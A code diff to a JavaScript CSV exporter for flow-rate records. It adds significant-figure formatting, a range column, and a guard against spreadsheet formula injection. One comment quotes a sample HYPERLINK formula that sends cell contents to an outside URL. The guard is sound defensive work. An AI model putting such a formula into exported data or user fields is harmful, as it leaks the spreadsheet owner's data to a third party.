@@ -31,6 +31,7 @@
     "GPM",
     "GPH",
     "GPD",
+    "Chart Range",
     "Site Label",
     "Notes",
     "Latitude",
@@ -61,6 +62,37 @@
     return n.toFixed(digits);
   }
 
+  /*
+   * Flow figures at the same 4 significant figures the screen and the PDF use.
+   * A fixed decimal count made a chart value read off a 4-figure table leave as
+   * "6855.0000" -- eight significant figures, none of them earned.
+   */
+  function sig(value) {
+    return FR.format.significantPlain(value, 4);
+  }
+
+  /*
+   * Neutralize spreadsheet formula injection (CWE-1236). Excel, LibreOffice and
+   * Sheets evaluate any cell whose text begins with = + - @ (or a leading tab
+   * or CR), and RFC 4180 quoting does NOT prevent it: the quotes are stripped
+   * during parsing and the formula runs. A note reading
+   *   =HYPERLINK("http://.../?d="&A1,"Results")
+   * becomes a live exfiltration link for whoever opens the export.
+   *
+   * The prefix is an apostrophe, per OWASP: spreadsheets treat it as "the rest
+   * of this cell is literal text" and hide it. It does alter the byte sequence,
+   * which is the deliberate trade -- a note that survives as text beats one
+   * that arrives as #NAME?.
+   *
+   * Applied ONLY to free text. Numeric columns must never pass through here:
+   * every southern-hemisphere latitude and western longitude begins with "-",
+   * and quoting those would corrupt real data to guard against nothing.
+   */
+  function deFormula(text) {
+    const s = String(text);
+    return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
+  }
+
   function rowFor(rec) {
     const core = FR.core;
     const isWeir = rec.mode === core.MODES.weir.id;
@@ -76,11 +108,12 @@
       isTimed ? fixed(core.recordVolumeInUSGallons(rec), 4) : "",
       isWeir && rec.weirType ? FR.weir.typeFor(rec.weirType).displayName : "",
       isWeir ? fixed(rec.headInches, 3) : "",
-      fixed(rec.gpm, 4),
-      fixed(rec.gph, 3),
-      fixed(rec.gpd, 2),
-      rec.siteLabel || "",
-      rec.notes || "",
+      sig(rec.gpm),
+      sig(rec.gph),
+      sig(rec.gpd),
+      core.rangeStatusFor(rec),
+      deFormula(rec.siteLabel || ""),
+      deFormula(rec.notes || ""),
       rec.latitude != null ? fixed(rec.latitude, 6) : "",
       rec.longitude != null ? fixed(rec.longitude, 6) : "",
       rec.locationAccuracyMeters != null ? fixed(rec.locationAccuracyMeters, 1) : "",
@@ -100,5 +133,5 @@
     return out;
   }
 
-  FR.csv = { HEADERS, escapeField, build, rowFor };
+  FR.csv = { HEADERS, escapeField, deFormula, build, rowFor };
 })(typeof self !== "undefined" ? self : this);
